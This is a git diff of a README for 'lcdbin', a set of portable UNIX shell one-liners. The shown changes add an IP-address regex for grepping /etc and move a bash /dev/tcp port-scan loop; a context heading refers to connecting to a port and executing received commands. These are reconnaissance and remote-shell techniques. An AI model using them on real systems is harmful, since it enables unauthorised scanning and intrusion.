@@ -2,6 +2,8 @@
 
 An **lcdbin** is a lowest-common denominator binary; a platform-agnostic oneliner that should work on almost any UNIX environment.
 
+## Universal Oneliners
+
 Parse listening ports on /proc/net/tcp:
 
 ```shell
@@ -12,13 +14,10 @@ Get all IP addresses in /etc/:
 
 ```shell
 grep -ro '[0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}' /etc/* 2>/dev/null
+grep -Ero '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b' /etc/* 2>/dev/null
 ```
 
-Scan TCP ports:
-
-```shell
-for i in {1..9000}; do SERVER="127.0.0.1"; PORT=$i; (echo  > /dev/tcp/$SERVER/$PORT) &> /dev/null && echo "Port $PORT seems to be open"; done
-```
+## /dev/tcp (requires bash)
 
 Connect to a port and execute the command received:
 
@@ -36,4 +35,10 @@ Use dyndns.org to find your public IP address:
 
 ```shell
 exec 3<>/dev/tcp/checkip.dyndns.org/80; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3
+```
+
+Scan TCP ports:
+
+```shell
+for i in {1..9000}; do SERVER="127.0.0.1"; PORT=$i; (echo  > /dev/tcp/$SERVER/$PORT) &> /dev/null && echo "Port $PORT seems to be open"; done
 ```
